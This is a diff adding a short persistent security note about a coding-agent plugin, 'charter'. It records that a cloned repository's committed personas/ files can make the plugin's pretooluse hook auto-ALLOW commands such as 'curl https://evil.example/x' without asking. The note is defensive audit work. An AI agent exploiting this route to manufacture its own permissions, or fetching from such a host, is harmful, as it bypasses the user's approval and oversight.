@@ -1,0 +1,5 @@
+# OUTSIDE A PLANE, A CLONED REPO'S OWN personas/ DIRECTORY DECIDES WHICH C
+
+_2026-09-03 15:49 · persistent_
+
+OUTSIDE A PLANE, A CLONED REPO'S OWN personas/ DIRECTORY DECIDES WHICH COMMANDS SKIP THE PROMPT. Found on #852/#857: config.PERSONAS_DIR is <root>/personas and outside a plane the root is the CWD, so a checked-in personas/rogue/persona.md declaring tools:[curl] plus a committed active-persona pointer made charter's pretooluse hook answer permissionDecision: ALLOW for 'curl https://evil.example/x'. A repository you cloned grants itself permissions, in any directory where charter's plugin is enabled and no plane exists. This is the same class as the guard-override ruling ([[guard-override-ruling-370-pr-379-charter-delibe]] — charter has NO config key that lifts a denial, precisely so a committed file cannot flip one), reached through a different door: not lifting a denial, but manufacturing an ALLOW. GENERAL RULE: every config.<X>_DIR is root-relative, and outside a plane the root is untrusted input. Before trusting any charter state in a hook, establish that a plane exists — HAS_CONTROL_PLANE gates only 5 of the sites that need it (pre-#857).
